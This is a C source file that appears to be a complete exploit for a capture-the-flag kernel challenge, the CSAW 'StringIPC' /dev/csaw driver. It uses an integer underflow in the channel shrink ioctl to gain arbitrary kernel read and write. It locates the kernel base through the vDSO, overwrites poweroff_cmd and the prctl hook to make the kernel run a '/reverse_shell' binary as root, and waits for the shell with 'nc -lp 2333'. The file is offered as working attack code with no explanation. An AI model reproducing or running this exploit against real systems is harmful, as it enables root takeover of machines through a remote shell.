#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/auxv.h>
#include <sys/prctl.h>

#define CSAW_IOCTL_BASE     0x77617363
#define CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1
#define CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2
#define CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3
#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4
#define CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5
#define CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6
#define CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7
#define CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8

struct alloc_channel_args{
    size_t buf_size;
    int id;
};

struct shrink_channel_args{
    int id;
    size_t size;
};

struct read_channel_args{
    int id;
    char *buf;
    size_t count;
};

struct write_channel_args{
    int id;
    char *buf;
    size_t count;
};

struct seek_channel_args{
    int id;
    loff_t index;
    int whence;
};

size_t check_have_writed(char * shellcode)
{
    size_t vdso_usr, ret;
    vdso_usr = getauxval(AT_SYSINFO_EHDR);
    printf("[+] vdso_usr:0x%lx\n", vdso_usr);
    ret = memmem(vdso_usr, 0x1000, shellcode, strlen(shellcode));
    if(ret){
        return ret;
    }
    return 0;
}

int main(int argc, char *argv[], char *envp[])
{
    struct alloc_channel_args alloc_channel;
    struct shrink_channel_args shrink_channel;
    struct read_channel_args read_channel;
    struct write_channel_args write_channel;
    struct seek_channel_args seek_channel;

    char *buf = malloc(0x1000);
    char pid[1];
    size_t addr;
    size_t search;
    size_t cred, real_cred, task_struct;
    size_t vdso_kernel, vdso_usr;
    char *comm = "gettimeofday\0";

    char payload[] = "/reverse_shell\0";

    int fd = open("/dev/csaw", O_RDWR);
    if(fd < 0){
        printf("[-] open dev error!\n");
        return 0;
    }
    alloc_channel.id = -1;
    alloc_channel.buf_size = 0x100;
    ioctl(fd, CSAW_ALLOC_CHANNEL, &alloc_channel);
    if(alloc_channel.id == -1){
        printf("[-] alloc channel failed!\n");
        return 0;
    }

    shrink_channel.id = alloc_channel.id;
    shrink_channel.size = 0x101;
    ioctl(fd, CSAW_SHRINK_CHANNEL, &shrink_channel);

    for(addr = 0xffffffff80000000; addr < 0xffffffffffffefff; addr += 0x1000){
        seek_channel.id = alloc_channel.id;
        seek_channel.index = addr-0x10;
        seek_channel.whence = SEEK_SET;
        ioctl(fd, CSAW_SEEK_CHANNEL, &seek_channel);

        read_channel.id = alloc_channel.id;
        read_channel.buf = buf;
        read_channel.count = 0x1000;
        ioctl(fd, CSAW_READ_CHANNEL, &read_channel);
        search = memmem(read_channel.buf, 0x1000, "gettimeofday", 12);
        if(search && ((search -(size_t)buf) == 0x2cd)){
                vdso_kernel = addr;
                printf("[+] vdso_kernel: 0x%lx\n",vdso_kernel);
                break;
            }
    }
    size_t kernel_base = vdso_kernel & 0xffffffffff000000;
    size_t prctl_hook = kernel_base + 0xeb7df8;
    size_t poweroff_cmd = kernel_base + 0xE4DFA0;
    size_t poweroff_func = kernel_base + 0x0A39C0;
    
    printf("kernel_base :0x%lx\n", kernel_base);
    printf("prctl_hook :0x%lx\n", prctl_hook);
    printf("poweroff_cmd :0x%lx\n", poweroff_cmd);
    printf("poweroff_func :0x%lx\n", poweroff_func);

    seek_channel.id = alloc_channel.id;
    seek_channel.index = poweroff_cmd - 0x10;
    seek_channel.whence = SEEK_SET;
    ioctl(fd, CSAW_SEEK_CHANNEL, &seek_channel);

    write_channel.id = alloc_channel.id;
    write_channel.buf = payload;
    write_channel.count = strlen(payload);
    ioctl(fd, CSAW_WRITE_CHANNEL, &write_channel);
    
    char poweroff_func_addr[8];
    for(int i = 0; i < 8; i++){
        poweroff_func_addr[i] = (char)(poweroff_func & 0xff);
        poweroff_func = poweroff_func >> 8;
    }

    seek_channel.id = alloc_channel.id;
    seek_channel.index = prctl_hook - 0x10;
    seek_channel.whence = SEEK_SET;
    ioctl(fd, CSAW_SEEK_CHANNEL, &seek_channel);
        
    write_channel.id = alloc_channel.id;
    write_channel.buf = poweroff_func_addr;
    write_channel.count = strlen(poweroff_func_addr);
    ioctl(fd, CSAW_WRITE_CHANNEL, &write_channel);
        
    if (fork()==0){
        prctl(kernel_base, 2, kernel_base, kernel_base, 2);
        printf("[+] child process.\n");
        exit(-1);
             
    }
    printf("[+] parent process. listen .....\n");
    system("nc -lp 2333");

    return 0;
}


